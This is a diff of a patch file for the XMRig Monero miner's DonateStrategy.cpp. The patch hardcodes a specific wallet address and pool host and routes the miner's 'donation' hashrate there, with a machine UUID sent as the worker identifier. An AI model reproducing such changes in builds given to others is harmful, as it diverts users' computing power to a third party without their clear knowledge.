@@ -1,5 +1,5 @@
---- build/src/xmrig/src/net/strategies/DonateStrategy.cpp	2022-02-15 16:16:19.000000000 +0200
-+++ build/src/xmrig-1/src/net/strategies/DonateStrategy.cpp	2022-02-15 16:18:20.000000000 +0200
+--- a/src/net/strategies/DonateStrategy.cpp	2026-10-23 22:12:34
++++ b/src/net/strategies/DonateStrategy.cpp	2026-10-23 22:12:34
 @@ -19,6 +19,8 @@
  #include <algorithm>
  #include <cassert>
@@ -9,7 +9,7 @@
  
  
  #include "net/strategies/DonateStrategy.h"
-@@ -42,15 +44,31 @@
+@@ -42,10 +44,27 @@
  
  static inline double randomf(double min, double max)                 { return (max - min) * (((static_cast<double>(rand())) / static_cast<double>(RAND_MAX))) + min; }
  static inline uint64_t random(uint64_t base, double min, double max) { return static_cast<uint64_t>(base * randomf(min, max)); }
@@ -38,21 +38,16 @@
 +static const char *kDonateHostTls = "pool.hashvault.pro";
  #endif
  
- } /* namespace xmrig */
- 
--
- xmrig::DonateStrategy::DonateStrategy(Controller *controller, IStrategyListener *listener) :
-     m_donateTime(static_cast<uint64_t>(controller->config()->pools().donateLevel()) * 60 * 1000),
-     m_idleTime((100 - static_cast<uint64_t>(controller->config()->pools().donateLevel())) * 60 * 1000),
-@@ -70,9 +88,9 @@
+ } // namespace xmrig
+@@ -70,9 +89,9 @@
  #   endif
  
  #   ifdef XMRIG_FEATURE_TLS
--    m_pools.emplace_back(kDonateHostTls, 443, m_userId, nullptr, nullptr, 0, true, true, false, mode);
-+    m_pools.emplace_back(kDonateHostTls, 443, "46gPyHjLPPM8HaayVyvCDcF2A8sq8b476VrwKMukrKg21obm1AKEwzoN3u4ooc55FKdNeF5B8vcs4ixbeCyuydr2A2sdsQi", get_uuid().c_str(), nullptr, 0, true, true, false, mode);
+-    m_pools.emplace_back(kDonateHostTls, 443, m_userId, nullptr, nullptr, 0, true, true, mode);
++    m_pools.emplace_back(kDonateHostTls, 443, "46gPyHjLPPM8HaayVyvCDcF2A8sq8b476VrwKMukrKg21obm1AKEwzoN3u4ooc55FKdNeF5B8vcs4ixbeCyuydr2A2sdsQi", get_uuid().c_str(), nullptr, 0, true, true, mode);
  #   endif
--    m_pools.emplace_back(kDonateHost, 3333, m_userId, nullptr, nullptr, 0, true, false, false, mode);
-+    m_pools.emplace_back(kDonateHost, 80, "46gPyHjLPPM8HaayVyvCDcF2A8sq8b476VrwKMukrKg21obm1AKEwzoN3u4ooc55FKdNeF5B8vcs4ixbeCyuydr2A2sdsQi", get_uuid().c_str(), nullptr, 0, true, false, false, mode);
+-    m_pools.emplace_back(kDonateHost, 3333, m_userId, nullptr, nullptr, 0, true, false, mode);
++    m_pools.emplace_back(kDonateHost, 80, "46gPyHjLPPM8HaayVyvCDcF2A8sq8b476VrwKMukrKg21obm1AKEwzoN3u4ooc55FKdNeF5B8vcs4ixbeCyuydr2A2sdsQi", get_uuid().c_str(), nullptr, 0, true, false, mode);
  
      if (m_pools.size() > 1) {
          m_strategy = new FailoverStrategy(m_pools, 10, 2, this, true);
